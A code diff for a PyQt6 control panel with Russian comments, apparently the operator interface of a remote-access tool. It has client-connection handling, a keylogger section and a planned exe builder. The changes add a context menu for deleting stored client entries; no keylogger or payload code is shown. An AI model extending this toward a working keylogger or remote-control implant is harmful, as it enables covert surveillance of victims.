@@ -4,9 +4,9 @@ import sys
 import asyncio
 from PyQt6.QtWidgets import (QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                              QPushButton, QTextEdit, QLabel, QScrollArea, QTableWidget, 
-                             QTableWidgetItem, QLineEdit, QMessageBox)
+                             QTableWidgetItem, QLineEdit, QMessageBox, QMenu)
 from PyQt6.QtCore import Qt, QTimer
-from PyQt6.QtGui import QIcon
+from PyQt6.QtGui import QIcon, QPixmap
 from qasync import asyncSlot
 # import discordrp
 import logging
@@ -210,6 +210,7 @@ class MainWindow(QMainWindow):
     logging.info("Предупреждение отображено в терминале")
 
   # Функция подключения к client
+  @asyncSlot()
   async def handle_client(self, reader, writer):
     logging.debug("сопряжение с клиентом прошло успешно")
     self.reader = reader
@@ -232,10 +233,10 @@ class MainWindow(QMainWindow):
       self.terminal_output.append(f"если ты это видишь, видимо ты где-то облажался, rest and peace")
       self.terminal_output.insertHtml(f"<font color='red'>{e}</font><br>")
     finally:
-        # Закрытие соединения
-        logging.info(f'Закрытие соединения с клиентом {self.writer.get_extra_info("peername")}')
-        writer.close()
-        await writer.wait_closed()
+      # Закрытие соединения
+      logging.info(f'Закрытие соединения с клиентом {self.writer.get_extra_info("peername")}')
+      writer.close()
+      await writer.wait_closed()
 
 
   #! Обработка команд
@@ -350,24 +351,14 @@ class MainWindow(QMainWindow):
 
 
 
-
-
   #! Видео
   @asyncSlot()
   async def show_video(self):
     """
     Отображает интерфейс для видео.
     """
-    logging.info("Отображение интерфейса для видео")
     self.clear_content()
-
-    logging.debug("Создание метки для видео")
-    self.video_label = QLabel("Здесь будет видео")
-    self.video_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
-
-    logging.debug("Добавление метки в макет")
-    self.content_layout.addWidget(self.video_label)
-
+    
 
   #! Key Logger
   @asyncSlot()
@@ -443,7 +434,7 @@ class MainWindow(QMainWindow):
 
 
 
-  #! Информация
+  #! Сборка
   @asyncSlot()
   async def show_info(self):
     """
@@ -457,11 +448,7 @@ class MainWindow(QMainWindow):
     self.info_label.setAlignment(Qt.AlignmentFlag.AlignLeft)
 
     info_text = f"""
-    Вывод1 - [Переменная1]
-    Вывод2 - [Переменная2]
-    Вывод3 - [Переменная3]
-    Вывод4 - [Переменная4]
-    Вывод5 - [Переменная5]
+    Здесь будет сборка exe(Скоро)
     """
 
     logging.debug("Установка текста для метки информации")
@@ -485,7 +472,7 @@ class MainWindow(QMainWindow):
     """)
     self.db_connection.commit()
 
-  #* Отображение
+# Отображение БД
   @asyncSlot()
   async def show_database(self):
     """
@@ -516,38 +503,81 @@ class MainWindow(QMainWindow):
     self.input_layout.addWidget(self.port_input)
     self.input_layout.addWidget(self.add_button)
 
-    # Создаем контейнер для удаления строк
-    self.delete_container = QWidget()
-    self.delete_layout = QHBoxLayout(self.delete_container)
-
-    # Создаем поле ввода для номера строки
-    self.delete_input = QLineEdit()
-    self.delete_input.setPlaceholderText("Номер строки")
-    self.delete_input.setFixedWidth(100)  # Ограничиваем ширину поля ввода
-
-    # Создаем кнопку "Удалить"
-    self.delete_button = QPushButton("Удалить")
-    self.delete_button.clicked.connect(self.delete_from_database)
-
-    # Добавляем поле ввода и кнопку в layout
-    self.delete_layout.addWidget(self.delete_input)
-    self.delete_layout.addWidget(self.delete_button)
-    self.delete_layout.addStretch()  # Добавляем растяжку, чтобы кнопка была слева
-
     # Создаем прокручиваемую область и таблицу
     self.scroll_area = QScrollArea()
     self.scroll_area.setWidgetResizable(True)
 
     self.table_widget = QTableWidget()
+    self.table_widget.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)  # Включаем контекстное меню
+    self.table_widget.customContextMenuRequested.connect(self.show_context_menu)  # Подключаем обработчик
     self.scroll_area.setWidget(self.table_widget)
 
-    # Добавляем контейнеры с полями ввода и таблицу в layout
+    # Добавляем контейнер с полями ввода и таблицу в layout
     self.content_layout.addWidget(self.input_container)
-    self.content_layout.addWidget(self.delete_container)
     self.content_layout.addWidget(self.scroll_area)
 
     # Обновляем таблицу данными из базы данных
     await self.update_table()
+
+  #* Контекстное меню для таблицы
+  def show_context_menu(self, position):
+    """
+    Показывает контекстное меню при клике правой кнопкой мыши на ячейку первого столбца.
+    """
+    # Получаем строку, на которую кликнули
+    row = self.table_widget.rowAt(position.y())
+    col = self.table_widget.columnAt(position.x())
+
+    # Показываем меню только для первого столбца
+    if col == 0 and row >= 0:
+      # Создаем контекстное меню
+      menu = QMenu(self.table_widget)
+
+      #* НАШИ ДЕЙСТВИЯ
+      # Добавляем действие "Сказать привет"
+      say_hello_action = menu.addAction("Сказать привет")
+      say_hello_action.triggered.connect(lambda: self.say_hello(row))
+
+      # Добавляем действие "Удалить"
+      delete_user_action = menu.addAction("Удалить пользователя")
+      delete_user_action.triggered.connect(lambda: self.delete_user(row))
+
+      # Показываем меню
+      menu.exec(self.table_widget.viewport().mapToGlobal(position))
+
+  # ФУНКЦИИ КОНТЕКСТНОГО МЕНЮ
+  # ТЕСТ: Сказать привет
+  def say_hello(self, row):
+    """
+    Выводит сообщение с приветствием для выбранной строки.
+    """
+    name = self.table_widget.item(row, 0).text()
+    QMessageBox.information(self, "Привет", f"Привет, {name}!")
+
+  # Удаление пользователя из БД
+  def delete_user(self, row):
+    row_number = row + 1
+    try:
+      if row_number < 1:
+        QMessageBox.warning(self, "Ошибка", "Номер строки должен быть больше 0")
+        return
+
+      # Получаем список ID из базы данных
+      self.cursor.execute("SELECT id FROM connection_table")
+      ids = [row[0] for row in self.cursor.fetchall()]
+
+      # Проверяем, что номер строки корректен
+      if 1 <= row_number <= len(ids):
+        # Удаляем строку из базы данных
+        self.cursor.execute("DELETE FROM connection_table WHERE id = ?", (ids[row_number - 1],))
+        self.db_connection.commit()
+        self.update_table()  # Обновляем таблицу
+      else:
+        QMessageBox.warning(self, "Ошибка", "Номер строки вне диапазона")
+    except ValueError:
+      QMessageBox.warning(self, "Ошибка", "Ошибка: введите корректный номер строки")
+
+
 
   #* Добавление данных в базу данных
   @asyncSlot()
@@ -584,40 +614,6 @@ class MainWindow(QMainWindow):
     # Обновляем таблицу
     await self.update_table()
 
-  #* Удаление строки из базы данных
-  @asyncSlot()
-  async def delete_from_database(self):
-    """
-    Удаляет строку из базы данных по указанному номеру.
-    """
-    # Получаем номер строки из поля ввода
-    row_number_text = self.delete_input.text().strip()
-    if not row_number_text:
-      print("Введите номер строки")
-      return
-
-    try:
-      row_number = int(row_number_text)  # Преобразуем в число
-      if row_number < 1:
-        print("Номер строки должен быть больше 0")
-        return
-
-      # Получаем список ID из базы данных
-      self.cursor.execute("SELECT id FROM connection_table")
-      ids = [row[0] for row in self.cursor.fetchall()]
-
-      # Проверяем, что номер строки корректен
-      if 1 <= row_number <= len(ids):
-        # Удаляем строку из базы данных
-        self.cursor.execute("DELETE FROM connection_table WHERE id = ?", (ids[row_number - 1],))
-        self.db_connection.commit()
-        await self.update_table()  # Обновляем таблицу
-        self.delete_input.clear()  # Очищаем поле ввода
-      else:
-        print("Номер строки вне диапазона")
-    except ValueError:
-      print("Ошибка: введите корректный номер строки")
-
   #* Обновление таблицы
   @asyncSlot()
   async def update_table(self):
@@ -646,16 +642,6 @@ class MainWindow(QMainWindow):
     self.db_connection.close()
     event.accept()
 
-  #! Очистка интерфейса
-  def clear_content(self):
-    """
-    Очищает содержимое основного окна, удаляя все виджеты из content_layout.
-    """
-    for i in reversed(range(self.content_layout.count())):
-      self.content_layout.itemAt(i).widget().setParent(None)
-
-    # Устанавливаем что кейлоггер не активен(чтобы не загружать систему)
-    self.keylogger_active = False
 
 
   def validate_ip(self, ip):
@@ -718,3 +704,14 @@ class MainWindow(QMainWindow):
         color: #{editable_colors["text_color"]};  /* Белый текст */
       }}
     """)
+
+  #! Очистка интерфейса
+  def clear_content(self):
+    """
+    Очищает содержимое основного окна, удаляя все виджеты из content_layout.
+    """
+    for i in reversed(range(self.content_layout.count())):
+      self.content_layout.itemAt(i).widget().setParent(None)
+
+    # Устанавливаем что кейлоггер не активен(чтобы не загружать систему)
+    self.keylogger_active = False
